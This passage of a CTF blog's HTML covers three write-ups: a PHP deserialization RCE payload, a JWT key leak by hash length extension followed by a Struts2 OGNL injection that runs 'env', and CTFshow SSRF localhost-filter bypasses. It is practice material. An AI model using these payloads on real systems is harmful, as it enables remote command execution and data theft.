class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;title);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>])) &#123;</span><br><span class="line">   <span class="variable">$Data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NSS&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>现找可利用的点</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fmm</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">      <span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;title);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></div></figure>

<p>把$b当做函数调用了，$b的值为$this-&gt;a;  命令为（$this-&gt;title);例system()</p>
<p>可以利用这个，将a的值提前写好为system，title为ls  cat flag啥的</p>
<p>$b就会被赋值为system，内容为ls</p>
<p>在it类中触发__wake up，会返回到一个没有用的类里，要绕过一下</p>
<p>梳理下来，就是construct-&gt;to_string-&gt;destruct</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lt</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$impo</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md51</span> = <span class="string">&#x27;s878926199a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$md52</span> = <span class="string">&#x27;s155964671a&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;https://www.ctfer.vip&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lt</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;impo=<span class="keyword">new</span> <span class="title function_ invoke__">fin</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:2:&quot;lt&quot;:3:&#123;s:4:&quot;impo&quot;;O:3:&quot;fin&quot;:3:&#123;s:1:&quot;a&quot;;s:6:&quot;system&quot;;s:3:&quot;url&quot;;s:21:&quot;https://www.ctfer.vip&quot;;s:5:&quot;title&quot;;s:4:&quot;ls /&quot;;&#125;s:4:&quot;md51&quot;;s:11:&quot;s878926199a&quot;;s:4:&quot;md52&quot;;s:11:&quot;s155964671a&quot;;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<img src="/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/1/hexoblog/source/image/image-20230804203006691.png" alt="image-20230804203006691">

<p>最终playload</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?NSS=O:2:&quot;lt&quot;:4:&#123;s:4:&quot;impo&quot;;O:3:&quot;fin&quot;:3:&#123;s:1:&quot;a&quot;;s:6:&quot;system&quot;;s:3:&quot;url&quot;;s:21:&quot;https://www.ctfer.vip&quot;;s:5:&quot;title&quot;;s:9:&quot;cat /flag&quot;;&#125;s:4:&quot;md51&quot;;s:11:&quot;s878926199a&quot;;s:4:&quot;md52&quot;;s:11:&quot;s155964671a&quot;;&#125;</span><br></pre></td></tr></table></div></figure>

</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/07/29/jwtstruts/">Jwt&amp;struts2</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-07-29</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="ctf–web–jwt2struts">
          <a href="#ctf–web–jwt2struts" class="heading-link"><i class="fas fa-link"></i></a><a href="#ctf–web–jwt2struts" class="headerlink" title="*ctf–web–jwt2struts"></a>*ctf–web–jwt2struts</h1>
      <p>记录一下</p>
<p>打开发现，猜测为jwt伪造</p>
<blockquote>
<p>You are now logged in as user. Try to become admin.</p>
</blockquote>
<p>CTRL+U</p>
<blockquote>
<p>JWT_key.php</p>
</blockquote>
<p>第一个知识点，想办法拿到Jwt伪造的key</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./secret_key.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./salt.php&quot;</span>;</span><br><span class="line"><span class="comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span></span><br><span class="line"><span class="comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span></span><br><span class="line">@<span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">@<span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> != <span class="string">&quot;root&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="variable">$username</span>.<span class="variable">$password</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The secret_key is &quot;</span>. <span class="variable">$secret_key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这是一个</p>

        <h2 id="哈希长度扩展攻击">
          <a href="#哈希长度扩展攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#哈希长度扩展攻击" class="headerlink" title="哈希长度扩展攻击"></a>哈希长度扩展攻击</h2>
      <p>用工具<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://github.com/bwall/HashPump">hashpump</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight sh"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/bwall/HashPump.git</span><br><span class="line">$ apt-get install g++ libssl-dev</span><br><span class="line">$ <span class="built_in">cd</span> HashPump</span><br><span class="line">$ make</span><br><span class="line">$ make install</span><br><span class="line">$ ./hashpump</span><br></pre></td></tr></table></div></figure>

<blockquote>
<p>input Signature&#x3D; e6ccbf12de9d33ec27a5bcfb6a3293df  &#x2F;&#x2F;这里填已经有的hash值</p>
<p>input  Data&#x3D;adminroot  &#x2F;&#x2F;这里填已知的，也就是你要上传的</p>
<p>input Key&#x3D;14  &#x2F;&#x2F;这里填未知的密文长度，题目给了14</p>
<p>input Data to Add&#x3D;  abcd &#x2F;&#x2F;这里填你自己要添加的字符串，长度尽量大于2</p>
</blockquote>
<p><img src="/2023/07/29/jwtstruts/AAwangzhan\1\hexoblog\source\image\image-20230729211158878.png"></p>
<blockquote>
<p>adminroot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00abcd</p>
</blockquote>
<p>把\x替换为%</p>
<p>因为</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">@<span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br></pre></td></tr></table></div></figure>

<p>password进行了一次url解码，我们要先提前对它进行一次url编码</p>
<blockquote>
<p>root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00abcd</p>
</blockquote>
<p>编码后为</p>
<blockquote>
<p>root%2580%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%25b8%2500%2500%2500%2500%2500%2500%2500abcd</p>
</blockquote>
<p>payload</p>
<p><img src="/2023/07/29/jwtstruts/AAwangzhan\1\hexoblog\source\image\image-20230729210104769.png"></p>
<p>拿到key</p>
<blockquote>
<p>sk-he00lctf3r</p>
</blockquote>
<p>抓包原页面拿session</p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://jwt.io/">jwt</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="/2023/07/29/jwtstruts/AAwangzhan\1\hexoblog\source\image\image-20230729210217434.png"></p>
<p>在”your-256-bit-secret”处放入你的key</p>
<p>修改明文，可以拿到加密后的session</p>
<p><img src="/2023/07/29/jwtstruts/AAwangzhan\1\hexoblog\source\image\image-20230729210132220.png"></p>
<p>修改session放包，发现页面自动跳转到&#x2F;admiiiiiiiiiiin&#x2F;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;do you know struts2?</span><br></pre></td></tr></table></div></figure>

<p>看名字可以知道是</p>

        <h2 id="struts2">
          <a href="#struts2" class="heading-link"><i class="fas fa-link"></i></a><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h2>
      <p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_52527336/article/details/125533839">struts2</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>flag在环境变量里可以找到，原来的文件…..可能没有，可能没有了</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;env&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></div></figure>

<p>HOSTNAME&#x3D;27102e2d72c4LANGUAGE&#x3D;en_US:enJAVA_HOME&#x3D;&#x2F;opt&#x2F;java&#x2F;openjdkGPG_KEYS&#x3D;05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 5C3C5F3E314C866292F359A8F3AD5C94A67F707E 765908099ACF92702C7D949BFA0C35EA8AA299F1 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 9BA44C2621385CB966EBA586F72C284D731FABEE A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23PWD&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcatTOMCAT_SHA512&#x3D;9e6770e9c9c3b630011c0f0e320b31bb0ea3700d52247a12d544ea25f9ee4d93613ad6ccb7939f97fb05e1760978a7547eccb16352d73fa28886134ba58f3f8cTOMCAT_MAJOR&#x3D;8HOME&#x3D;&#x2F;rootLANG&#x3D;en_US.UTF-8TOMCAT_NATIVE_LIBDIR&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;native-jni-libFLAG&#x3D;flag{7r0m_jwt_t0_struts2}CATALINA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcatSHLVL&#x3D;0JDK_JAVA_OPTIONS&#x3D; –add-opens&#x3D;java.base&#x2F;java.lang&#x3D;ALL-UNNAMED –add-opens&#x3D;java.base&#x2F;java.io&#x3D;ALL-UNNAMED –add-opens&#x3D;java.base&#x2F;java.util&#x3D;ALL-UNNAMED –add-opens&#x3D;java.base&#x2F;java.util.concurrent&#x3D;ALL-UNNAMED –add-opens&#x3D;java.rmi&#x2F;sun.rmi.transport&#x3D;ALL-UNNAMEDLD_LIBRARY_PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;native-jni-libLC_ALL&#x3D;en_US.UTF-8PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;bin:&#x2F;opt&#x2F;java&#x2F;openjdk&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;binTOMCAT_VERSION&#x3D;8.5.91JAVA_VERSION&#x3D;jdk8u372-b07</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/07/22/SSRF%20%20web351-/">SSRF-CTFshow</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-07-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-11</span></span></div></header><div class="post-body"><div class="post-excerpt"><h1 id><a href="#" class="headerlink" title></a></h1>
        <h1 id="SSRF-web351-web360">
          <a href="#SSRF-web351-web360" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF-web351-web360" class="headerlink" title="SSRF  web351-web360"></a>SSRF  web351-web360</h1>
      <p>写在前面：ssrf常见的一些函数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl_init()：初始curl会话</span><br><span class="line">curl_setopt()：会话设置</span><br><span class="line">curl_close()：会话关闭</span><br><span class="line">file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。</span><br><span class="line">readfile()：输出一个文件的内容。</span><br><span class="line">fsockopen()：打开一个网络连接或者一个Unix 套接字连接。</span><br><span class="line">curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</span><br><span class="line">fopen()：打开一个文件文件或者 URL。</span><br></pre></td></tr></table></div></figure>




        <h2 id="web351">
          <a href="#web351" class="heading-link"><i class="fas fa-link"></i></a><a href="#web351" class="headerlink" title="web351"></a>web351</h2>
      <p>url&#x3D;<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="web352">
          <a href="#web352" class="heading-link"><i class="fas fa-link"></i></a><a href="#web352" class="headerlink" title="web352"></a>web352</h2>
      <p>url&#x3D;<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://127.1.0.1/flag.php">http://127.1.0.1/flag.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="web353">
          <a href="#web353" class="heading-link"><i class="fas fa-link"></i></a><a href="#web353" class="headerlink" title="web353"></a>web353</h2>
      <p>url&#x3D;<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://127.1.0.1/flag.php">http://127.1.0.1/flag.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>parse_url()解析请求包的参数，返回数组，scheme是请求包的协议</p>
<p>127.1会被解析成127.0.0.1，也就意味着为零可缺省<br>在Linux中，0也会被解析成127.0.0.1<br>127.0.0.0&#x2F;8是一个环回地址网段，从127.0.0.1 ~ 127.255.255.254都表示localhost<br>ip地址还可以通过表示成其他进制的形式访问，IP地址二进制、十进制、十六进制互换</p>

        <h2 id="web354">
          <a href="#web354" class="heading-link"><i class="fas fa-link"></i></a><a href="#web354" class="headerlink" title="web354"></a>web354</h2>
      <p>url&#x3D;<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://sudo.cc/flag.php">http://sudo.cc/flag.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="web355">
          <a href="#web355" class="heading-link"><i class="fas fa-link"></i></a><a href="#web355" class="headerlink" title="web355"></a>web355</h2>
      <p>这题限制了<code>http://[host]/[path]</code> host部分长度小于5</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></div></figure>

<p>url&#x3D;<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.1/flag.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="web356">
          <a href="#web356" class="heading-link"><i class="fas fa-link"></i></a><a href="#web356" class="headerlink" title="web356"></a>web356</h2>
      <p>host长度要小于3</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></div></figure>

<p>url&#x3D;<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://0.0.0.0/flag.php">http://0/flag.php</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="web357">
          <a href="#web357" class="heading-link"><i class="fas fa-link"></i></a><a href="#web357" class="headerlink" title="web357"></a>web357</h2>
      
        <h2 id="web358">
          <a href="#web358" class="heading-link"><i class="fas fa-link"></i></a><a href="#web358" class="headerlink" title="web358"></a>web358</h2>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>这段代码使用了正则表达式来定义条件，具体条件如下：</p>
<ul>
<li><code>^</code>：表示匹配字符串的开始位置。</li>
<li><code>http://ctf\.</code>：表示以 “<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://ctf/">http://ctf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>.” 开头。其中，<code>.</code> 是正则表达式中的特殊字符，需要使用 <code>\</code> 进行转义。</li>
<li><code>.*</code>：表示匹配任意字符（除换行符外）的零个或多个实例。</li>
<li><code>show$</code>：表示以 “show” 结尾。</li>
<li><code>/i</code>：表示不区分大小写。</li>
</ul>
<p>综合起来，这个正则表达式的意思是判断给定的 URL 是否以 “<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://ctf/">http://ctf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>.” 开头，以 “show” 结尾，并且不区分大小写。</p>
<p>如果传入的 URL 满足上述条件，就会执行 <code>echo file_get_contents($url);</code> 的代码，使用 <code>file_get_contents()</code> 函数获取该 URL 的内容，并将其输出到页面上</p>
<p>想要做的输出flag.php无法作到在flag.PHP后面直接加show，加一个传参的形式即可</p>
<p>url&#x3D;<span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="http://ctf.@127.0.0.1/flag.php?show">http://ctf.@127.0.0.1/flag.php?show</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="web359">
          <a href="#web359" class="heading-link"><i class="fas fa-link"></i></a><a href="#web359" class="headerlink" title="web359"></a>web359</h2>
